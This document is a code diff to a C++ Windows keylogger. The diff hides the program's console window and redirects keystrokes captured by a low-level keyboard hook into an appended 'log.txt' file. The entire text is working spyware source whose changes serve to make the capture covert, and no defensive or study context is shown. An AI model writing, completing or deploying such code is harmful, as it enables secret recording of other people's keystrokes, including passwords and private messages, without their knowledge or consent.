@@ -9,12 +9,16 @@
 // Time
 #include <ctime>
 
+// File handling
+#include <fstream>
+
 // Windows specific functions
 #include <Windows.h>
 
 
 // ---------------------------------------------------------------------------------------------
 
+#define logFilePath "log.txt"
 
 // Low level keyboard hook
 HHOOK keyboardHook;
@@ -24,6 +28,9 @@ bool isHoldingShift;
 
 // The time when the user last pressed a key
 clock_t lastKeyPressTime;
+
+// The log file that we're writing key presses to
+std::ofstream logFile;
 
 
 // ---------------------------------------------------------------------------------------------
@@ -188,9 +195,10 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 
 		// If it has been a while since the last key press signifiy this with a new line
 		if (lastKeyPressTime == NULL || (float(clock() - lastKeyPressTime) / CLOCKS_PER_SEC) > 2.5)
-			std::cout << std::endl << keyStr;
-		else
-			std::cout << keyStr;
+			keyStr = keyStr + "\n";
+
+		// Now we write this key to the log file
+		logFile << keyStr;
 
 		lastKeyPressTime = clock();
 	}
@@ -205,6 +213,9 @@ int main() {
 	
 	// First we remove the console window
 	HWND window;
+	AllocConsole();
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 0);
 	
 	// Now we register a low level keyboard hook with windows
 	keyboardHook = SetWindowsHookEx(
@@ -217,6 +228,11 @@ int main() {
 	// If we successfully hooked to the keyboard
 	if (keyboardHook)
 	{
+		// Initiate our handle to the log file
+		logFile.open(logFilePath, std::ios::app);
+		if (logFile.fail())
+			std::cout << "Failed to open file";
+
 		// Stay in the program until we're told to stop
 		MSG msg;
 		while (!GetMessage(&msg, NULL, NULL, NULL)) {
